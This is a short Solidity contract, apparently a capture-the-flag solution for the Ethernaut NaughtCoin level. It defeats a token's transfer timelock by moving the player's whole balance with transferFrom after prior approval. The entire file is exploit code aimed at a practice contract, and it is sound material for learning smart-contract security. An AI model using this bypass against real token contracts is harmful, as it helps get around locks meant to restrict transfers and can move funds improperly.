// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { IERC20 } from "openzeppelin-contracts/token/ERC20/IERC20.sol"; 

interface INaughtCoin is IERC20 {
    function transfer(address _to, uint256 _value) external returns (bool);
}

contract HackNaughtCoin {
    INaughtCoin private _naughtCoin;

    constructor(address naughtCoin) {
        _naughtCoin = INaughtCoin(naughtCoin);
    }

    // Level instance player has the token balance. Calling transfer from an external
    // Caller must approve this contract prior to attack
    function attack(address to) external {
        address spender = msg.sender;
        uint256 amount = _naughtCoin.balanceOf(spender);
        _naughtCoin.transferFrom(spender, to, amount);
    }
}
